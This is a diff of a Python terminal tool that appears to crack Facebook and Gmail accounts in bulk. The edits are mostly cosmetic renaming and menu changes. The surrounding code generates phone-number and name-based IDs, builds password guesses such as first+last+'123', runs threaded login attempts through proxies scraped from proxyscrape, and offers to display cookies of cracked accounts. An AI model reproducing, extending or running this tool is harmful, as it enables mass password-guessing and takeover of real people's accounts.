@@ -27,7 +27,7 @@ ugen=[]
 ###----------[ GET PROXY ]----------###
 redmi=[]
 try:
- print('\033[32;1mSuccess')
+ #print('\033[32;1m')
  uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
  open('.proxy.txt','w').write(uno)
 except:pass
@@ -298,7 +298,7 @@ def clear():
 def banner():
     #os.system('clear')
     print(f"""   
-        d8888 888       d888   8888888888 
+      d8888 888       d888   8888888888 
       d88888 888      d8888   888        
      d88P888 888        888   888        
     d88P 888 888        888   8888888    
@@ -338,7 +338,7 @@ cuuu=('ber')
 #
 #
 gffff=('FB-')
-kffff=('KING')
+kffff=('AL1F')
 c0=('ht')
 c4=('tps://')
 c1=('tinyurl')
@@ -350,6 +350,7 @@ cuuu=('ber')
 
 def mainx():
     clear();banner()
+    linex()
     #print(f"{K} [{H}1{K}] {WHITE}Create File ")
     #print(f"{K} [{H}2{K}] {WHITE}Public Cloning ")
     #print(f"{K} [{H}3{K}] {WHITE}File   Cloning ")
@@ -358,8 +359,9 @@ def mainx():
     #print(f'{K} [{H}6{K}] {WHITE}Remove Duplicate Ids')
     print(f'{K} [{H}7{K}] {N}Follow Github ')
     print(f'{K} [{H}8{K}] {N}Contract CYB3R-A1IF')
-    print(f"{K} [{M}0{K}] {WHITE}Exit Tools ");print(led)
-    Alif = input(f'{wt}Select menu {M}:{H} ')
+    print(f"{K} [{M}0{K}] {WHITE}Exit Tools ")
+    linex()
+    Alif = input(f'{wt}Chose Option> {M}:{H} ')
     if Alif in ["00000","0000000"]:
         exit()
     #elif Alif in ["2","02"]:
@@ -377,9 +379,8 @@ def mainx():
     elif Alif in ["3","03"]:
      os.system("xdg-open https://www.facebook.com/freelancer.alif.09");mainx()
     elif Alif in ["0","00"]:
-     print(f'{gen}{RED}Exited {H}CYB3R-A1IF {P}Terminal ');os.system("xdg-open https://www.facebook.com/freelancer.alif.09");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
-    else:
-     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/freelancer.alif.09");mainx()
+     print(f'{gen}{RED}Exited {P}Tools');os.system("xdg-open https://www.facebook.com/freelancer.alif.09")
+     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/freelancer.alif.09")
 # SEPARATE IDS -- MAIN DEF #
 def sep():
     os.system('clear')
@@ -388,34 +389,34 @@ def sep():
         limit = int(input(f'{wt}Separate Ids Limit {M}?{K} [{H}1{P}/{B}100{K}] {M}:{H} '))
     except:
         limit = 1
-    print(led);print(f'{gen}Example {M}:{H} /sdcard/filename.txt');print(led)
+    linex();print(f'{gen}Example {M}:{H} /sdcard/filename.txt');linex()
     file_name = input(f'{wt}{N}Put File {M}:{H} ')
-    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
-          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Alif.txt');print(led)
+    linex();print(f'{dot}Total File Ids {M}:{H} ' +
+          str(len(open(file_name).read().splitlines())));linex();print(f'{gen}Example {M}:{H} /sdcard/Alif.txt');linex()
     new_save = input(f'{wt}{N}File Save {M}:{H} ')
     y = 0
     for k in range(limit):
         y += 1
-        print(led);print(f'{dot}√ {P}[{H}100077{P}] [{H}100070{P}] [{H}100010{P}] [{H}100060{P}]\033[1;0m ');print(led);print(f'{dot}√[{H}100085{P}] [{H}100086{P}] [{H}100089{P}] [{H}10009{P}]\033[1;0m ');print(led)
+        linex();print(f'{dot}√ {P}[{H}100077{P}] [{H}100070{P}] [{H}100010{P}] [{H}100060{P}]\033[1;0m ');linex();print(f'{dot}√[{H}100085{P}] [{H}100086{P}] [{H}100089{P}] [{H}10009{P}]\033[1;0m ');linex()
         links = input(f'{wt}Put Link {M}:\033[1;32m ')
         os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
-    print(led);print(f'{dot}{N}Links Grabbed Successfully');print(led);print(f'{dot}Total Grabbed Links {M}:\033[1;32m '+
-          str(len(open(new_save).read().splitlines())));print(led);print(f'{gen}New File Save As {M}:{H} '+new_save);print(led)
+    linex();print(f'{dot}{N}Links Grabbed Successfully');linex();print(f'{dot}Total Grabbed Links {M}:\033[1;32m '+
+          str(len(open(new_save).read().splitlines())));linex();print(f'{gen}New File Save As {M}:{H} '+new_save);linex()
     input(f'{wt} {P}Main Menu {M}?{K} [{H}Press enter to back{K}] {M}:{H} ')
     mainx()
 # 2LINK REMOVER -- MAIN DEF #
 def dupcutter():
-    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/Alif.txt');print(led)
-    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Alif.txt');print(led)
+    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/Alif.txt');linex()
+    Error = input(f"{wt}{N}File Name {RED}:{H} ");linex();print(f'{dot}Example   {RED}:{H} /sdcard/Alif.txt');linex()
     Error1 = input(f"{wt}{N}New File  {RED}:{H} ")
     os.system('touch ' + Error)
     os.system('sort -r '+Error+' | uniq > '+Error1)
-    print(led);print(f"{dot}Removing Successful{RED}:{H} "+ Error);print(led);print(f"{dot}File Total Ids {RED}:{H} "+str(len(open(Error1).read().splitlines())));print(led);print(f"{dot}New File Save As {H} " + Error1);print(led)
+    linex();print(f"{dot}Removing Successful{RED}:{H} "+ Error);linex();print(f"{dot}File Total Ids {RED}:{H} "+str(len(open(Error1).read().splitlines())));linex();print(f"{dot}New File Save As {H} " + Error1);linex()
     input(f'{dot}Main Menu {RED}?{K} [{H}Press enter to back{K}] {RED}:{H} ')
     mainx()
 # FILE CRACK -- MAIN DEF #
 def cr():
-            os.system('clear');banner();print(f'{dot}Follow This Link Ids {P}[{H}10009,100089{P}] ');time.sleep(0.05);print(led)
+            os.system('clear');banner();print(f'{dot}Follow This Link Ids {P}[{H}10009,100089{P}] ');time.sleep(0.05);linex()
             try:
                 fileX = input(f"{wt}Input File {RED}:{H} ")
                 for line in open(fileX, 'r').readlines():
@@ -425,7 +426,7 @@ def cr():
                print(f"\n{wt}{RED}File %s not found"%(fileX))
                mainx()
 def setting():
-    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}New Ids Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}Mix Ids Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}Old Ids Crack [{H}Slow{P}]');print(led)
+    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));linex();print(f' {K}[{H}1{K}] {P}New Ids Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}Mix Ids Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}Old Ids Crack [{H}Slow{P}]');linex()
     hu = input(f'{dot}Select menu {M}:{H} ')
     if hu in ['3','old']:
         for tua in sorted(id):
@@ -444,15 +445,15 @@ def setting():
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
     else:print('Wrong try again');exit();print('')
-    print(led)
+    linex()
     xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
     else:cp_xdx.append('n')
-    print(led)
+    linex()
     cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
-    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]');print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]');print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
     hc = input(f'{wt}Select Method {M}:{H} ')
     if hc in ['1','01']:method.append('m1')
     elif hc in ['2','02']:method.append('m2')
@@ -461,14 +462,14 @@ def setting():
     elif hc in ['5','05']:method.append('a1')
     elif hc in ['6','06']:method.append('f1')
     else:method.append('m1')
-    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Password [{H}first+last{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}first+last+3{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}first+last+5+{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}first+last+7+{P}]');print(led)
+    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));linex();print(f' {K}[{H}1{K}] {P}Password [{H}first+last{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}first+last+3{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}first+last+5+{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}first+last+7+{P}]');linex()
     px=input(f'{wt}Select Password {M}:{H} ')
     if px in ['1','01']:p1()
     elif px in ['2','02']:p2()
     elif px in ['3','03']:p3()
     else:p4()
 def p1():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));linex();print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;linex()
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -493,7 +494,7 @@ def p1():
             else:pool.submit(m5,idf,pwv)
     print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
 def p2():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));linex();print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;linex()
     with tred(max_workers=30) as pool:
         for yuzong in id02:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -518,7 +519,7 @@ def p2():
             else:pool.submit(m5,idf,pwv)
     print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
 def p3():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));linex();print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;linex()
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -543,7 +544,7 @@ def p3():
             else:pool.submit(m5,idf,pwv)
     print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
 def p4():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));linex();print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;linex()
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -570,207 +571,207 @@ def p4():
 # GMAIL CRACK -- MAIN DEF #
 def gf1(): 
     idf=[]
-    os.system('clear');banner();print(fst);print(led)
-    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
-    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
+    os.system('clear');banner();print(fst);linex()
+    first = input(f'{dot}First Name {M}: {H}');linex();print(lst);linex()
+    last = input(f'{dot}Last Name {M}: {H}');linex();print(limitt);linex()
     limit = int(input(f'{dot}Crack Limit {M}: {H}'))
     domain = '@gmail.com'
-    print(led)
+    linex()
     xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
     else:cp_xdx.append('n')
-    print(led)
+    linex()
     cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
     tkk = first+last
-    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
     mthd = input(f'{wt}Select Method {M}:{H} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         idf.append(nmp)
-    with tred(max_workers=40) as king_xd:
+    with tred(max_workers=40) as AL1F_xd:
         os.system('clear')
         idx = str(len(idf))
         tk = first+last
-        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
+        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);linex()
         for number in idf:
             idf = first+'.'+last+'.'+number+domain
             pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
-            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
-            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
-            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
-            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
-            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
-            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
+            if mthd in ['1','01']:AL1F_xd.submit(m1,idf,pwv)
+            elif mthd in ['2','02']:AL1F_xd.submit(m2,idf,pwv)
+            elif mthd in ['3','03']:AL1F_xd.submit(m3,idf,pwv)
+            elif mthd in ['4','04']:AL1F_xd.submit(m4,idf,pwv)
+            elif mthd in ['5','05']:AL1F_xd.submit(f1,idf,pwv)
+            elif mthd in ['6','06']:AL1F_xd.submit(f1,idf,pwv)
             else:
-               king_xd.submit(m5,idf,pwv)
+               AL1F_xd.submit(m5,idf,pwv)
     print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
     input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
 def gf2(): 
     idf=[]
-    os.system('clear');banner();print(fst);print(led)
-    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
-    last = input(f'{dot}Last Name {M}: {H}');print(led);print(limitt);print(led)
+    os.system('clear');banner();print(fst);linex()
+    first = input(f'{dot}First Name {M}: {H}');linex();print(lst);linex()
+    last = input(f'{dot}Last Name {M}: {H}');linex();print(limitt);linex()
     limit = int(input(f'{dot}Crack Limit {M}: {H}'))
     domain = '@gmail.com'
-    print(led)
+    linex()
     xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
     else:cp_xdx.append('n')
-    print(led)
+    linex()
     cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
     tkk = first+last
-    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+    banner();print(f"{dot}{P}Gmail Ids {RED}: {tkk[:4]}****{domain}");linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
     mthd = input(f'{wt}Select Method {M}:{H} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
         idf.append(nmp)
-    with tred(max_workers=40) as king_xd:
+    with tred(max_workers=40) as AL1F_xd:
         os.system('clear')
         idx = str(len(idf))
         tk = first+last
-        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
+        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);linex()
         for number in idf:
             idf = first+'.'+last+number+domain
             pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
-            if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
-            elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
-            elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
-            elif mthd in ['4','04']:king_xd.submit(m4,idf,pwv)
-            elif mthd in ['5','05']:king_xd.submit(f1,idf,pwv)
-            elif mthd in ['6','06']:king_xd.submit(f1,idf,pwv)
+            if mthd in ['1','01']:AL1F_xd.submit(m1,idf,pwv)
+            elif mthd in ['2','02']:AL1F_xd.submit(m2,idf,pwv)
+            elif mthd in ['3','03']:AL1F_xd.submit(m3,idf,pwv)
+            elif mthd in ['4','04']:AL1F_xd.submit(m4,idf,pwv)
+            elif mthd in ['5','05']:AL1F_xd.submit(f1,idf,pwv)
+            elif mthd in ['6','06']:AL1F_xd.submit(f1,idf,pwv)
             else:
-               king_xd.submit(m5,idf,pwv)
+               AL1F_xd.submit(m5,idf,pwv)
     print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
     input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
 
 def x8():
   user=[]
-  os.system('clear');banner();print(c8);print(led)
-  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
-  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
+  os.system('clear');banner();print(c8);linex()
+  kode = input(f'{dot}Select Code {M}: {H}');linex();print(limitt);linex()
+  limit = int(input(f'{dot}Crack Limit {M}: {H}'));linex()
   xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
   else:cp_xdx.append('n')
-  print(led)
+  linex()
   cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
   hc = input(f'{wt}Select Method {M}:{H} ')
   for nmbr in range(limit):
     koda = ''.join(random.choice(string.digits) for _ in range(2))
     kodb = ''.join(random.choice(string.digits) for _ in range(2))
     nmp = ''.join(random.choice(string.digits) for _ in range(4))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=30) as AL1F_xd:
     os.system('clear')
     tl = str(len(user))
-    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
+    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');linex()
     for guru in user:
       idf = kode+koda+kodb+guru
       pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:]] #,'@#@#@#','bangladesh','free fire','i love you']
-      if hc in ['1','01']:king_xd.submit(m1,idf,pwv)
-      elif hc in ['2','02']:king_xd.submit(t1,idf,pwv)
-      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
-      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
-      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
-      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
+      if hc in ['1','01']:AL1F_xd.submit(m1,idf,pwv)
+      elif hc in ['2','02']:AL1F_xd.submit(t1,idf,pwv)
+      elif hc in ['3','03']:AL1F_xd.submit(m3,idf,pwv)
+      elif hc in ['4','04']:AL1F_xd.submit(m4,idf,pwv)
+      elif hc in ['5','05']:AL1F_xd.submit(f1,idf,pwv)
+      elif hc in ['6','06']:AL1F_xd.submit(f1,idf,pwv)
       else:
-       king_xd.submit(main,idf,pwv)
+       AL1F_xd.submit(main,idf,pwv)
 # BANGLADESH 7 DIGIT -- MAIN DEF #
 def x7():
   user=[]
-  os.system('clear');banner();print(c7);print(led)
-  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
-  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
+  os.system('clear');banner();print(c7);linex()
+  kode = input(f'{dot}Select Code {M}: {H}');linex();print(limitt);linex()
+  limit = int(input(f'{dot}Crack Limit {M}: {H}'));linex()
   xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
   else:cp_xdx.append('n')
-  print(led)
+  linex()
   cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');linex()
   hc = input(f'{wt}Select Method {M}:{H} ')
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(7))
     user.append(nmp)
-  with tred(max_workers=30) as king_xd:
+  with tred(max_workers=30) as AL1F_xd:
     os.system('clear')
     tl = str(len(user))
-    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
+    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');linex()
     for guru in user:
       idf = kode+guru
       pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
-      if hc in ['1','01']:king_xd.submit(m3,idf,pwv)
-      elif hc in ['2','02']:king_xd.submit(t1,idf,pwv)
-      elif hc in ['3','03']:king_xd.submit(m3,idf,pwv)
-      elif hc in ['4','04']:king_xd.submit(m4,idf,pwv)
-      elif hc in ['5','05']:king_xd.submit(f1,idf,pwv)
-      elif hc in ['6','06']:king_xd.submit(f1,idf,pwv)
+      if hc in ['1','01']:AL1F_xd.submit(m3,idf,pwv)
+      elif hc in ['2','02']:AL1F_xd.submit(t1,idf,pwv)
+      elif hc in ['3','03']:AL1F_xd.submit(m3,idf,pwv)
+      elif hc in ['4','04']:AL1F_xd.submit(m4,idf,pwv)
+      elif hc in ['5','05']:AL1F_xd.submit(f1,idf,pwv)
+      elif hc in ['6','06']:AL1F_xd.submit(f1,idf,pwv)
       else:
-       king_xd.submit(m5,idf,pwv)
+       AL1F_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python CYB3R-A1IF.py')
 # INDIA X PAKISTAN -- MAIN DEF #
 def x6():
   user=[]
-  os.system('clear');banner();print(c6);print(led)
-  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
-  limit = int(input(f'{dot}Crack Limit {M}: {H}'));print(led)
+  os.system('clear');banner();print(c6);linex()
+  kode = input(f'{dot}Select Code {M}: {H}');linex();print(limitt);linex()
+  limit = int(input(f'{dot}Crack Limit {M}: {H}'));linex()
   xd_cp=input(f'{wt}Cloning Show cp Account  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
   else:cp_xdx.append('n')
-  print(led)
+  linex()
   cokixx=input(f'{wt}Cloning Show Cookie  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}A1{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}F1{P}]');print(led)
+  clear();banner();print(f"{dot}{P}Number  {RED}: {H}"+kode);linex();print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
